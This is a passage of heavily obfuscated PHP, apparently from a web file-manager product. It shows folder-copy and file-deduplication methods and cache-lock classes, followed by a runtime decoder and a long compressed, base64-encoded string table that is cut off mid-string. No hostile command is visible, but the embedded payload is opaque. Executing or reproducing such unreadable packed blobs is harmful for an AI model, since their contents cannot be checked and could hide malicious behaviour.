Model($Ğ“¢àñÁ[560])->remove($®ûí³¹ [$Ğ“¢àñÁ[689]]); $this->folderSizeReset($“èøÕÈÒ); $this->updateModifyTime($“èøÕÈÒ); return $¼ÂÑ¼š²; } private function _copyChildTo($’ÕÈèş, $ÍÖè°Ÿ, $¶äãˆİò, $Ğˆ®ş€Ô, &$¸îŒŠ£Ë, $´ƒıÜìÇ, $âÖ×±•ª) { $É®Ùæï‡ =& $_SERVER[©—Ò»ÅĞ]; $—¬Ç´ã = $this->sourceInfoCache($¶äãˆİò); $İóãä­ = $’ÕÈèş->listPath($ÍÖè°Ÿ); $İóãä­ = $İóãä­ ? $İóãä­ : array($É®Ùæï‡[86] => array(), $É®Ùæï‡[85] => array()); $‚ÔØü = array_merge($İóãä­[$É®Ùæï‡[86]], $İóãä­[$É®Ùæï‡[85]]); $â—µµ‚£ = $this->_addFiles($’ÕÈèş, $âÖ×±•ª, $İóãä­[$É®Ùæï‡[86]], $´ƒıÜìÇ); $®ÌøºÖ¿ = array(); foreach ($‚ÔØü as &$„¯êõ±º) { if (isset($â—µµ‚£[$„¯êõ±º[$É®Ùæï‡[32]]])) { $„¯êõ±º = $â—µµ‚£[$„¯êõ±º[$É®Ùæï‡[32]]]; } $„¯êõ±º[$É®Ùæï‡[500]] = $„¯êõ±º[$É®Ùæï‡[33]] == $É®Ùæï‡[78]; $„¯êõ±º[$É®Ùæï‡[501]] = substr(_get($„¯êõ±º, $É®Ùæï‡[166], $É®Ùæï‡[12]), 0, 10); $„¯êõ±º[$É®Ùæï‡[79]] = _get($„¯êõ±º, $É®Ùæï‡[79], 0); $„¯êõ±º[$É®Ùæï‡[557]] = _get($„¯êõ±º, $É®Ùæï‡[557], 0); if (!isset($„¯êõ±º[$É®Ùæï‡[692]]) && $„¯êõ±º[$É®Ùæï‡[557]]) { $¸îŒŠ£Ë[$É®Ùæï‡[689]][] = $„¯êõ±º[$É®Ùæï‡[557]]; } if ($Ğˆ®ş€Ô) { $ÊœĞ†¥ï = $this->fileNameExistCache($¶äãˆİò, $„¯êõ±º[$É®Ùæï‡[32]]); if ($ÊœĞ†¥ï) { if ($„¯êõ±º[$É®Ùæï‡[500]] || $Ğˆ®ş€Ô == REPEAT_SKIP) { continue; } if ($Ğˆ®ş€Ô == REPEAT_REPLACE) { $õš¼À’Ô = $this->sourceInfoCache($ÊœĞ†¥ï); $«’€İùÆ = $this->fileHistory($õš¼À’Ô, $„¯êõ±º[$É®Ùæï‡[557]], $„¯êõ±º[$É®Ùæï‡[79]]); if ($«’€İùÆ) { $¸îŒŠ£Ë[$É®Ùæï‡[652]][] = $„¯êõ±º[$É®Ùæï‡[557]]; } continue; } else { if ($Ğˆ®ş€Ô == REPEAT_RENAME) { $„¯êõ±º[$É®Ùæï‡[32]] = $this->fileNameAutoCache($¶äãˆİò, $„¯êõ±º[$É®Ùæï‡[32]], $Ğˆ®ş€Ô, !1); } } } } if (!$„¯êõ±º[$É®Ùæï‡[500]] && $„¯êõ±º[$É®Ùæï‡[557]] == 0) { continue; } if (!$„¯êõ±º[$É®Ùæï‡[500]] && $„¯êõ±º[$É®Ùæï‡[557]]) { $¸îŒŠ£Ë[$É®Ùæï‡[652]][] = $„¯êõ±º[$É®Ùæï‡[557]]; } $®ÌøºÖ¿[] = $this->_makeItemData($„¯êõ±º, $—¬Ç´ã, $„¯êõ±º[$É®Ùæï‡[32]]); } unset($„¯êõ±º); if (!empty($®ÌøºÖ¿)) { $this->addAll($®ÌøºÖ¿); $this->_childrenListSelect($¶äãˆİò); } $ÑŒ–íè† = $this->_childrenList($¶äãˆİò); $ÑŒ–íè† = array_to_keyvalue($ÑŒ–íè†, $É®Ùæï‡[32]); foreach ($‚ÔØü as $„¯êõ±º) { $õš¼À’Ô = $ÑŒ–íè†[$„¯êõ±º[$É®Ùæï‡[32]]]; $şàúÕ = $õš¼À’Ô[$É®Ùæï‡[191]]; $this->_copyApplyMeta($õš¼À’Ô, $¸îŒŠ£Ë); if ($„¯êõ±º[$É®Ùæï‡[33]] == $É®Ùæï‡[78]) { $„¯êõ±º[$É®Ùæï‡[87]] = $’ÕÈèş->getPathInner($„¯êõ±º[$É®Ùæï‡[87]]); $this->_copyChildTo($’ÕÈèş, $„¯êõ±º[$É®Ùæï‡[87]], $şàúÕ, $Ğˆ®ş€Ô, $¸îŒŠ£Ë, $´ƒıÜìÇ, $âÖ×±•ª); } } } private function _addFiles($÷ûØ´£, $È¹¯¹¸, $¨†Æóœ, $‹Õß…™) { $Ïğ«Ÿºæ =& $_SERVER[©—Ò»ÅĞ]; if (!$¨†Æóœ || count($¨†Æóœ) == 0) { return array(); } $¼™Ä€Ò» = array(); foreach ($¨†Æóœ as &$§¼½´Á) { Hook::trigger($Ïğ«Ÿºæ[693], $§¼½´Á); $§¼½´Á[$Ïğ«Ÿºæ[87]] = $÷ûØ´£->getPathInner($§¼½´Á[$Ïğ«Ÿºæ[87]]); $á·ôÅáí = $÷ûØ´£->hashSimple($§¼½´Á[$Ïğ«Ÿºæ[87]]); $ĞüÌú± = $÷ûØ´£->hashMd5($§¼½´Á[$Ïğ«Ÿºæ[87]]); if (strlen($ĞüÌú±) > 10 && !isset($¼™Ä€Ò»[$ĞüÌú±])) { $¼™Ä€Ò»[$ĞüÌú±] = array(); } $§¼½´Á[$Ïğ«Ÿºæ[694]] = $á·ôÅáí; $§¼½´Á[$Ïğ«Ÿºæ[563]] = $ĞüÌú±; $¼™Ä€Ò»[$ĞüÌú±][] =& $§¼½´Á; if (count($¼™Ä€Ò»[$ĞüÌú±]) > 1) { $§¼½´Á[$Ïğ«Ÿºæ[692]] = !0; } Hook::trigger($Ïğ«Ÿºæ[695], $§¼½´Á); } unset($§¼½´Á); $¾ĞÉÁŞ° = array($Ïğ«Ÿºæ[563] => array($Ïğ«Ÿºæ[7], array_keys($¼™Ä€Ò»))); $óóí³À = Model($Ïğ«Ÿºæ[696]); $´ß’‘“Ã = $óóí³À->where($¾ĞÉÁŞ°)->select(); $´ß’‘“Ã = $´ß’‘“Ã ? $´ß’‘“Ã : array(); foreach ($´ß’‘“Ã as $ó¥Ğü°ç) { if (!isset($¼™Ä€Ò»[$ó¥Ğü°ç[$Ïğ«Ÿºæ[563]]])) { continue; } $ÀÁôúÊ» = $¼™Ä€Ò»[$ó¥Ğü°ç[$Ïğ«Ÿºæ[563]]]; foreach ($ÀÁôúÊ» as &$§¼½´Á) { $§¼½´Á[$Ïğ«Ÿºæ[557]] = $ó¥Ğü°ç[$Ïğ«Ÿºæ[557]]; $§¼½´Á[$Ïğ«Ÿºæ[692]] = !0; } unset($§¼½´Á); } $‹«ğÅ„ = array(); foreach ($¨†Æóœ as $“¨Ÿú) { Hook::trigger($Ïğ«Ÿºæ[697], $“¨Ÿú); if (isset($“¨Ÿú[$Ïğ«Ÿºæ[692]]) && $“¨Ÿú[$Ïğ«Ÿºæ[692]]) { Hook::trigger($Ïğ«Ÿºæ[698], $“¨Ÿú); continue; } $Ø¾Ş×‰î = $÷ûØ´£->getPathInner($“¨Ÿú[$Ïğ«Ÿºæ[87]]); $ĞÏ¸šüó = $óóí³À->addFileMake($Ø¾Ş×‰î, $È¹¯¹¸, $“¨Ÿú[$Ïğ«Ÿºæ[79]], $“¨Ÿú[$Ïğ«Ÿºæ[694]], $“¨Ÿú[$Ïğ«Ÿºæ[563]], $“¨Ÿú[$Ïğ«Ÿºæ[32]], $‹Õß…™); Hook::trigger($Ïğ«Ÿºæ[698], $“¨Ÿú); if (!is_array($ĞÏ¸šüó)) { continue; } $‹«ğÅ„[] = $ĞÏ¸šüó; } $óóí³À->addAll($‹«ğÅ„); $¾ĞÉÁŞ° = array($Ïğ«Ÿºæ[563] => array($Ïğ«Ÿºæ[7], array_keys($¼™Ä€Ò»))); $´ß’‘“Ã = $óóí³À->where($¾ĞÉÁŞ°)->select(); $´ß’‘“Ã = $´ß’‘“Ã ? $´ß’‘“Ã : array(); foreach ($´ß’‘“Ã as $ó¥Ğü°ç) { if (!isset($¼™Ä€Ò»[$ó¥Ğü°ç[$Ïğ«Ÿºæ[563]]])) { continue; } $«’®ŞšÎ =& $¼™Ä€Ò»[$ó¥Ğü°ç[$Ïğ«Ÿºæ[563]]]; foreach ($«’®ŞšÎ as &$§¼½´Á) { $§¼½´Á[$Ïğ«Ÿºæ[557]] = $ó¥Ğü°ç[$Ïğ«Ÿºæ[557]]; } unset($§¼½´Á); } $ô©µË¸ = array(); foreach ($¨†Æóœ as $şçóÊ›Õ) { $ô©µË¸[$şçóÊ›Õ[$Ïğ«Ÿºæ[32]]] = $şçóÊ›Õ; } return $ô©µË¸; } } define($_SERVER[©—Ò»ÅĞ][699], $_SERVER[©—Ò»ÅĞ][700]); $nfxdtkclqw = $_SERVER[©—Ò»ÅĞ][701]; goto aãµ’‰¸àå; BöŠ§«Ô»†: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÖÛÛÒòç =& $_SERVER[©—Ò»ÅĞ]; $—Óø¾Ÿ = $GLOBALS[$ÖÛÛÒòç[6]][$ÖÛÛÒòç[424]]; self::$cachePath = $—Óø¾Ÿ[$ÖÛÛÒòç[230]][$ÖÛÛÒòç[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($§ÎÎü’, $²°Ü‡µÛ = 0) { $²œµ«™¼ =& $_SERVER[©—Ò»ÅĞ]; $áÜÈøÛÖ = microtime(!0); $‚ı’« = $áÜÈøÛÖ + $²°Ü‡µÛ + 0.0001; $ò‚à®¾ = rtrim(self::$cachePath, $²œµ«™¼[8]) . $²œµ«™¼[1021] . md5($§ÎÎü’) . $²œµ«™¼[1018]; if (file_exists($ò‚à®¾) && filemtime($ò‚à®¾) && filemtime($ò‚à®¾) < time() - 10) { @unlink($ò‚à®¾); } do { if (file_exists($ò‚à®¾)) { cacheLockWait(); continue; } $ŒÛùÕ = fopen($ò‚à®¾, $²œµ«™¼[1022]); if (!$ŒÛùÕ) { return !1; } $”êÎÑ´ = flock($ŒÛùÕ, LOCK_EX | LOCK_NB); self::$caches[$§ÎÎü’] = array($²œµ«™¼[1023] => $ŒÛùÕ, $²œµ«™¼[230] => $ò‚à®¾); fwrite($ŒÛùÕ, $‚ı’«); clearstatcache(); if ($ŒÛùÕ && $”êÎÑ´) { return !0; } cacheLockWait(); } while (microtime(!0) < $‚ı’«); $this->unlock($§ÎÎü’); return !1; } public function lockGet($Œ®÷­’) { $î€Œì§¢ =& $_SERVER[©—Ò»ÅĞ]; $«Ê±³ùÉ = rtrim(self::$cachePath, $î€Œì§¢[8]) . $î€Œì§¢[1021] . md5($Œ®÷­’) . $î€Œì§¢[1018]; return file_exists($«Ê±³ùÉ); } public function unlock($©¬”¢¿‰) { $é¬ç†³ =& $_SERVER[©—Ò»ÅĞ]; $·ëµüãà = self::$caches[$©¬”¢¿‰]; if (!$·ëµüãà) { return; } @flock($·ëµüãà[$é¬ç†³[1023]], LOCK_UN); @fclose($·ëµüãà[$é¬ç†³[1023]]); @unlink($·ëµüãà[$é¬ç†³[230]]); unset(self::$caches[$©¬”¢¿‰]); } } class CacheLockRedis { public function lock($Í­ê÷†Ú, $‰Ø½ä = 10) { $úÍ»È‹ğ = Cache::init(); $‹ó®‘’ = microtime(!0) + $‰Ø½ä; while (microtime(!0) < $‹ó®‘’) { $­Şí°–á = $úÍ»È‹ğ->get($Í­ê÷†Ú); if (!$­Şí°–á) { $ƒşÀÁø‰ = $úÍ»È‹ğ->setLock($Í­ê÷†Ú, $‹ó®‘’, $‰Ø½ä); if ($ƒşÀÁø‰) { return !0; } } else { if ($­Şí°–á < microtime(!0)) { $úÍ»È‹ğ->set($Í­ê÷†Ú, $‹ó®‘’, $‰Ø½ä * 2); if ($úÍ»È‹ğ->get($Í­ê÷†Ú) === $­Şí°–á) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Š¤êš¶ù) { return Cache::init()->get($Š¤êš¶ù); } public function unlock($•¸°™®‘) { return Cache::init()->remove($•¸°™®‘); } } goto BÌºÈ™ß‰‘; c§å‡ˆ»ÙÄ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xa9\x97\xd2\xbb\xc5\xd0", base64_decode('+f7d/J3D')); $_SERVER[©—Ò»ÅĞ] = explode("\174\4\174\5\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x79\x7c\x1b\xd5\xb5\x70\x69\xcb\x5a\x68\xa1\xb4\x5\x1e\x85\x4e\xc\xc1\x76\xa2\xc5\x71\x76\x27\x4e\x90\x65\xd9\x16\x91\x2d\x23\xc9\x59\xb0\x9d\xc9\x48\x1a\x59\x13\x4b\x1a\x59".strrev('h/ï¿}á’3.ç.ï¾ÒÊ(+Âv5²ÖÊ<´¥–––!'."\n".'$´-”%'."\n".',¡Ù@ÚH’ò3')."\356\276\235\173\356\71\347\236\163\356\235\133\177\273\173\303\357\326\175\165\335\376\353\276\272\361\77\47\56\177\344\114\372\275\156\77\362\57\371\376\336\171\7\175\211\374\71\362\274\163\353\352\72\346\34\62"."\xbd\xeb\xd0\x8b\xee\xda\xa6\xdd\xa6\x6d\xd3\xce\x89\x46\x9e\x78\x32\x7c\xd8\x7f\xde\x76\x4a\x68\xe2\x86\x27\xc6\x26\xf6\xfb\xd2\xc3\x8b\xbe\x7d\x63\x13\xca\x4c\xcb\x36\xd1\x1f\xa5\x60\xda\x8a\x3e\x6a\x58\xb6\x45\x23\x52\x66"."\41\143\14\320\157\243\100\177\375\364\247\47\26\51\351\171\323\326\151\320\107\177\124\350\27\371\327\32\312\31\54\135\355\212\46\324\170\117\167\167\50\226\200\114\115\162\172\336\114\303\127\121\53\151\171\150"."\277\250\227\54\324\33\271\72\265\150\26\365\202\43\106\104\244\65\133\113\152\26\324\324\332\242\266\206\272\43\321\25\152\142\105\167\10\162\44\325\241\262\136\32\243\41\362\31\267\265\222\235\60\362\72\317"."\x31\x52\xe2\xfd\x6a\x9\xb5\x87\xbb\x94\x44\x2c\xd0\x15\xf\x4\x13\xe1\x68\x17\x8d\xe\x46\x3b\x3b\xc3\x89\xca\xf8\x58\x34\x12\x69\x9\x4\x97\x54\xa6\x74\xc7\x2\xed\x9d\x1\x5\xf5\x2f\xa7\xab\x46\x21\x63\xd6\x29\xab\x68".base64_decode('yiqlnn60GXouTT8LGuuOPVaErwT/QstUKOdyNNDFv9J6RivnYLZa5UCxZOQ1Nugl+hiPpR9a2TY=')."\215\102\212\6\102\243\166\111\23\361\250\257\51\264\320\172\1\252\212\207\42\241\140\102\301\35\124\332\142\321\116\5\26\41\257\131\266\136\122\226\165\204\142\41\5\167\272\271\226\214\265\126\1\170\351\102"."\123\241\4\42\21\145\262\32\154\75\137\144\325\320\62\125\52\213\306\132\103\61\245\145\205\42\146\50\145\346\363\146\301\207\152\101\53\151\113\135\15\305\142\364\303\3\340\35\11\343\105\203\100\264\255\55"."\x1e\xe2\x21\x18\xdc\xa9\x11\xd4\x93\x99\x0\x9f\x8e\x50\x3a\x93\xb3\xd5\x61\x2d\x57\x66\x60\x3a\x48\x7f\x6b\xe1\x7\x7e\x4d\xb\x40\x77\xc8\x28\x18\x65\x0\x53\xa8\xc2\x34\xf9\xb6\x82\x8f\x32\xcb\xad\xb3\x18\x3d\xd\x1f\x79".base64_decode('VN6EckmIS7Jcq9mHgXboMP1sXkR/F0D5pIrT9JKt6oWUmTYKsI8XAzxqdra1ZKAMNJwxc2n2bRk=').base64_decode('a2CUGSOnd5XzchYeTGWNXLrEtt7n5aTBCN/JOK8IFVFPOBIwMmNiK+J83TzVMsullB5GW4eGZ0A=')."\264\156\333\150\160\154\102\314\236\142\316\324\322\161\275\304\207\146\230\155\250\242\150\331\226\43\7\331\56\110\113\223\320\7\125\146\365\134\116\325\107\165\330\22\371\364\154\213\215\305\157\45\215\202\37\305"."\320\140\70\252\146\65\53\333\231\236\255\222\122\14\127\246\365\121\137\61\133\204\375\312\267\150\237\3\144\361\310\273\114\73\44\141\334\234\231\322\40\157\231\14\204\176\147\155\273\30\327\13\151\74\20\350".base64_decode('tjlSIAMt6jpkavUoaaVTWaF0NBlNFiuYz/EvNjoeZ/FIe5StRjoDwMYQfg00aFgEd4mNpxWLOSM=')."\xa5\xd9\x86\x59\xf0\x9b\x29\x5b\xb7\xbd\x96\x5d\xd2\x35\xa8\x31\x90\x4a\xe9\x96\xe5\xd\x9a\x5\xbb\x64\xe6\xbc\x81\x5c\xce\x1c\xf1\x46\x4b\xc6\x80\x51\x68\x52\xa6\x1\x1a\x45\x89\x68\xbb\x7a\x31\x6a\x6b\x82\x3d\x58\xb3\x40".base64_decode('weuOm5nWXLYz3nlsb/HcJa1gZfSSNwSA3aSgznL8xrK1GlbRtAzcvSZFs20tlcW4QVTf/Dn5jUI=')."\316\50\350\225\171\121\45\272\267\273\244\15\344\265\46\245\130\116\242\11\200\375\4\161\51\234\103\316\14\23\320\244\344\265\121\257\66\300\152\12\215\26\215\222\156\261\121\53\355\235\11\200\250\214\267\23".base64_decode('7wNDT3vjCPlCZTMbZikIVhSWRmM7EoluNdyGTteukNoZSAQ7oHZbG2BVRxBK5VWyyOVetB8wNHU=')."\241\301\211\310\156\163\104\57\241\206\133\306\232\224\101\63\235\64\107\175\54\11\147\216\43\304\300\62\343\365\55\332\336\230\126\30\300\303\110\216\331\272\345\106\55\55\350\54\366\145\350\346\363\45\365\214".base64_decode('WYLRWMMDzsmP6IUBO8vqjodiS0MxNR5tSywLxEKwixDkjLLe4NZz3pieRpOYslk5rShmf7kXbxg=')."\334\70\113\305\233\210\245\105\302\355\170\356\132\275\26\312\344\225\163\261\272\43\106\336\300\303\263\171\12\231\154\164\256\267\103\207\374\144\314\315\175\326\264\272\276\364\364\172\57\372\167\132\175\157\137\253"."\157\132\377\142\277\41\312\370\147\370\146\50\215\15\163\224\156\104\150\30\132\116\201\101\127\344\150\120\242\113\234\323\42\40\274\140\26\364\252\33\13\1\222\151\351\336\16\135\103\70\26\55\204\143\135\74"."\xac\x2d\x1a\xfe\x9c\xd9\xc5\x47\x9d\x84\x4b\x5c\xeb\x42\x23\x63\xa1\x53\x7b\x42\xf1\x84\xda\x19\x4a\x74\x44\x5b\xa1\xfb\xa1\x0\x7c\x15\x50\x61\xd2\x5f\xb6\xc6\x98\xae\x82\x53\xad\x0\xd5\xea\xa3\xd2\x11\x20\x50\x79\x4a\x9e".base64_decode('EFKuyxxhyNsFQMGsnhqcJA19wWhMipfY0vXSn36A5n76o6rBSCgQU4EgVQ2rTToFcZCjW9VMrkY=')."\200\326\251\333\232\30\0\152\56\234\107\133\132\14\104\165\36\131\154\224\235\2\360\321\16\132\146\244\371\231\206\202\35\272\61\220\205\176\33\270\272\224\231\63\113\132\16\37\5\214\14\35\60\0\53\27".base64_decode('c2W0Dfy44kS2nE8CNY6mbEC3BYVojSEyKs/OV3RI2+FWxykKIb+KQbfPVywM1J8IdamNsxtwBKw=')."\x2a\x8c\xc\x91\xca\x8c\xf4\x91\x87\xee\x4b\x99\x68\x9f\x77\x6a\x83\x7a\x13\x1e\xb\x20\xb7\x5\x24\x96\x5\x24\xfc\xb9\x0\x1f\x79\xcd\x6e\x34\x81\x57\x2b\xe7\xcb\xa3\x4a\x48\x9d\x41\x93\x1f\xc8\x94\x19\x59\xe0\x3c\xf2\x14"."\xbd\x54\x32\x4b\x53\x20\x7\xf9\x56\xc8\xb9\x89\x97\xb\x2a\xb7\x39\x11\x61\x21\x8c\xc0\xbe\xb3\x26\x27\x3a\x4c\x6\x9b\x4d\x7e\x18\xf7\xd4\xc6\x36\xc0\x22\x69\x44\x7c\xf9\x2c\x1b\x2d\x2\x1a\xa0\x96\x4e\x57\x8b\x46\x98\x7"."\52\130\307\300\226\44\60\262\300\37\237\211\376\27\64\100\332\314\153\354\104\305\210\210\67\213\3\26\17\221\143\122\117\323\163\322\21\105\67\70\215\232\306\232\54\331\46\116\54\71\162\42\40\315\232\320"."\151\4\25\60\340\62\37\71\233\203\264\236\323\31\200\145\165\106\152\64\100\66\264\62\34\374\62\174\37\40\136\0\305\12\22\315\260\142\250\44\46\14\130\170\31\146\236\104\4\246\216\0\256\304\147\16"."\xad\x6a\x94\x6c\x28\x11\xee\x2e\xe9\x19\x63\x94\xa1\x92\x51\xbb\x53\x2b\xd\xb2\x81\xa1\x92\x62\x2b\xe2\x80\xb4\x4d\xdb\x7a\x22\x11\x35\x18\xed\x4a\x20\xde\x8b\xc6\x2c\x8b\x85\x13\x21\x86\xb1\x2\xad\x6a\x20\xd8\xd\x21\x81"."\x3\x39\x1\x27\x93\x20\x34\x66\xb8\x11\x40\x8\x75\xc2\x2f\x68\x25\x74\x58\x17\xcd\x2\xc2\xb4\x80\xac\xbc\x82\x33\xab\x48\x4a\xb\x52\x2\x60\x47\x90\x1f\x2e\x8a\x2\xd1\x4\xf9\x35\xde\x3c\xc2\x2b\x5e\xde\xa7\xee\x1e\xa0"."\x5\x18\x54\x30\xaa\xb6\x65\xac\xcd\x2c\x31\x32\xce\x18\x28\x2c\xe5\x2b\xbf\x2c\x3e\xcb\xdb\xd1\x19\x8\x7a\xe3\x1d\x81\xc6\xd9\x73\x68\xec\x8a\x7c\xba\x2f\xd1\x61\x58\x7d\xa7\xf1\x30\x74\x67\xc4\x9a\xa5\x96\x74\xb4\xa7\x19".strrev('XŸzNDï8`Äw–çF]A©ÊTc-4ïã„¨E’}5Õ¡¡¯¥$Ák‹Şo'."\n".'ùèš%Ñ;`Ì64,')."\71\371\126\231\234\156\252\226\302\325\251\250\260\135\266\344\231\102\0\230\106\105\14\106\45\323\130\55\67\140\42\270\313\346\345\310\64\207\137\32\326\51\311\5\15\145\65\76\117\170\366\330\346\100\4\335".base64_decode('mFwITzPqA8PfThpbSVSfaEq6h2G2RT+K+GRDWJst20n05xDoRhnt25KxRpr9xawmhjOjcWhyNJ8=')."\23\54\24\114\15\314\246\74\264\121\25\245\250\220\242\312\51\35\34\17\260\125\350\154\165\355\11\172\370\323\270\205\213\121\213\312\60\26\310\230\205\346\332\31\276\206\132\205\61\226\315\265\75\211\66\104".strrev('¢Ú$	Ú¹lÂ`¡…jÉş…¾rı:œ„t×nb˜…Æ0EÜ…/ÙÎYÒ´b/™ ÂÈt^/§').base64_decode('sU6A8WJRgFUxVW23eQVGKlteHdPJsAu0VM4FovJcLK8KicurQeJyFyQur4TE5dXgbBgAUstra8w=')."\x2\xda\xaf\xe8\xa0\xcd\xfb\x52\x0\x16\x89\x8e\x70\xd7\x12\xb5\x33\xda\x1a\x8a\xa8\xe1\x2e\x44\xcf\x25\x2a\xe3\x7b\xba\x5b\x3\xc\xd\xca\xf1\x2d\xd1\x44\x87\x23\xb6\x7\x51\x74\x4b\x3\x91\xb0\x3b\x7b\x68\x79\x38\x9e\x88"."\127\115\102\161\75\41\127\112\153\213\332\35\13\265\205\227\363\140\133\70\24\151\215\253\301\100\260\103\344\351\12\164\102\0\321\112\172\56\155\371\235\371\125\104\232\306\271\324\114\5\200\203\220\103\120\245"."\62\21\214\52\60\61\142\163\164\130\16\30\56\226\73\222\221\250\14\125\225\71\241\311\170\372\74\73\152\21\213\6\323\316\370\223\72\372\123\257\4\342\212\135\124\371\241\232\34\343\237\144\30\54\254\62"."\142\22\221\43\320\21\5\350\345\212\256\250\70\117\213\304\25\125\217\10\144\154\116\222\272\302\350\54\21\151\150\51\2\104\322\211\100\202\54\15\64\143\240\223\251\144\7\130\167\62\102\312\250\106\273\103"."\xb1\x0\x96\x51\xaa\xcb\x62\xd1\xae\x76\x28\x30\x92\xd5\x59\x7\xc2\xb0\xe\x75\x8c\x4d\x5\x51\xa5\x2d\xe\x78\x2d\x67\x68\x4c\x66\x25\x66\x7f\xb5\xc9\xe6\x14\xb1\xe6\x8c\xf8\x2f\xb0\x9\x4f\x62\xea\x86\x91\xbc\xec\x23\x83"."\x76\x34\xa3\x4c\xcc\x32\xaf\x3f\x69\x9a\x50\x67\xe\x73\x64\x50\xbd\xc5\x60\x62\x94\x9d\xcf\xd3\xf9\xf9\x5\x90\x1a\x5d\x12\xea\x52\x19\x20\xd1\x90\x4\x7c\x34\x22\x14\x8b\x45\x63\x30\x6c\xdb\x1c\x64\xc2\x2c\x9a\x18\xb\xc5"."\103\11\166\302\17\225\15\66\51\176\337\164\0\132\35\321\164\320\274\177\145\337\310\364\272\136\357\164\137\77\372\250\237\166\62\15\102\250\317\347\10\62\122\273\134\342\245\61\31\130\147\55\256\157\352\363"."\367\371\353\26\67\365\6\274\153\64\357\232\6\357\174\157\77\42\320\353\247\103\104\377\332\106\317\254\365\70\3\312\270\370\204\176\364\323\334\267\170\152\237\367\244\323\127\235\334\333\327\137\333\64\175\112"."\x9f\xef\x84\xbe\x91\xfe\x69\xf5\x8b\x59\x3b\xa9\x72\x9\xf1\x0\xec\x60\x43\x5d\x4d\x4f\xaf\x43\x5d\x42\x4c\x2b\xcf\x52\x90\xf0\x30\xc9\xc0\x12\xd6\x18\x45\x11\xbb\x76\xce\x7a\x16\x8f\xd6\x4d\x1f\x10\x25\x7a\xbd\x7d\xd3\xfb".base64_decode('F0vlpCh3WwiVIoovy/MFvKfhkfGieJsDTJQLKXEaYuhPapz7GygItsoucQHnMIJIgXDXTqW/69k=').strrev('õf*Š2`rŒ8²ˆƒC¤å'."\n".'I(ƒ€Œ#¼P<èn±C›L>}7ñˆcÊ¦£2£èB')."\106\170\10\235\51\260\116\7\103\156\53\245\25\365\270\64\102\125\115\4\132\42\41\316\267\2\342\145\141\202\4\133\370\65\10\32\232\100\240\14\13\110\142\52\42\66\202\375\155\15\345\24\262\375\51\217"."\325\104\156\204\254\162\21\263\113\12\132\161\64\267\12\42\337\224\346\105\12\235\162\50\247\312\13\120\344\154\20\226\163\352\142\243\143\74\4\175\52\212\25\262\20\33\302\30\1\177\135\137\137\271\127\117"."\xf7\xf7\x22\xc0\xd7\xbc\x99\xfe\xb5\x33\xd7\xd7\x33\x59\x8a\xbf\xf\xfd\x61\x81\x40\x95\xbb\x9\x55\xb3\xd9\x94\x70\xec\xa7\xb6\x87\x12\x3e\xdc\x23\x2e\x8d\x76\x4\x78\x32\xd\x9a\x25\xc1\xfe\xab\xa9\x9c\xae\x95\xd8\xa4\x16"."\x1d\x7c\xbe\x6d\xda\x5a\xce\x51\x63\x2\xc7\x30\x3c\xc5\x28\x2b\x90\xf3\x52\x30\x88\x8\xf4\x85\x9\x10\xe9\xb6\x87\x60\xd3\x2e\x2e\x57\xe5\xf4\xb1\x74\xdd\x80\x4b\xc4\x75\xdb\xc7\x73\x78\xa4\x44\x15\x85\x65\xdc\xcd\x6f\x78"."\110\150\251\310\110\312\0\262\126\320\237\145\35\241\56\206\331\23\322\167\263\22\14\304\103\54\4\124\330\41\241\256\126\270\111\241\377\2\115\12\331\26\34\302\316\227\2\332\333\101\351\230\245\2\372\70"."\21\111\70\256\245\54\64\277\251\154\133\71\227\263\271\140\310\60\125\52\242\160\5\325\74\27\275\240\70\314\104\61\252\226\111\316\215\101\50\3\73\36\256\327\274\320\313\351\325\332\104\354\24\153\151\32"."\310\271\153\246\125\313\30\56\24\314\164\262\132\112\247\146\247\262\362\116\22\44\103\173\0\21\147\11\245\216\335\21\51\341\56\245\45\32\215\204\2\135\12\246\116\340\60\105\244\117\74\324\35\100\47\61"."\x96\xe1\xc6\x13\x21\xb8\xb6\x32\x0\x3c\xc2\xad\x5e\x56\xff\x72\x2f\x93\xdc\xf0\xf\xb3\x48\x39\x25\xdd\x56\x73\x26\xc3\x8d\x4e\x99\xf\x66\x37\x3d\x58\xf2\xe2\xc1\x94\x92\x7\x75\xda\x83\x85\x35\x1e\xc1\xcc\x7b\xc4\xd5\x8b"."\x67\xd8\xd0\x47\xc8\x7\x67\xb4\x3d\xc0\x7f\x7b\x84\x98\x9\x3e\xc3\xad\x1e\xc3\x6a\x25\x72\x4\xd2\x0\x49\x62\x5d\xb0\xb3\x58\xa4\x9e\xd3\xc6\x3c\xb4\x3b\x11\x7d\x58\xcf\x79\x98\x0\xca\xc3\xfa\xe8\x61\x62\x37\xf\x11\x97"."\xb5\x42\xb7\x7a\x10\xb6\x80\x6e\x91\x4f\x74\x28\x64\x3d\x18\x8\xf0\x2e\xf4\x88\xcb\x20\x8f\x39\x52\xd0\x4b\x24\xb\x4c\x9b\x10\x41\x78\x84\x78\xc2\x33\x50\x32\xcb\xc5\x6e\xd6\xa6\x14\xa2\xdd\x82\x8\xd1\x67\x1e\x11\x33\x4d".base64_decode('28MkeR5ZpAe9CLDdXnU6q4+GzL+7EwBeOKlylr5gsSrXwynNXEtrBEnuenaIO/IQqSKnpfGEiy8=')."\x9\x8b\xe0\x1\xb4\x69\x70\xed\x28\x6f\x56\xa7\x6c\x91\x1d\x9d\xc\x8c\xc5\xc5\x91\xb8\xf1\x13\x94\xbb\x5b\xb0\xe4\xbe\xb\xc4\x8d\x22\xf6\x30\x2e\x35\x67\x6b\x3\xac\x2d\x8c\x72\x39\xf3\x58\x25\x2b\xfd\x8e\xe9\xa9\xb1\x94".base64_decode('kFS1SvIvZ4jPPtk51aC++qpySOaLcMjBB7NZZeDNV9SxK754P8JICBqNFgVVRDuLj484OqXbcmw=').base64_decode('GhrlZDg4PM4Q3k4+ciiQ+/Q4F4pGQm0J5ZQowldOBKyQf8yC4qibTRc6N0iNPKwV0jRmFTqhVjU=')."\xd7\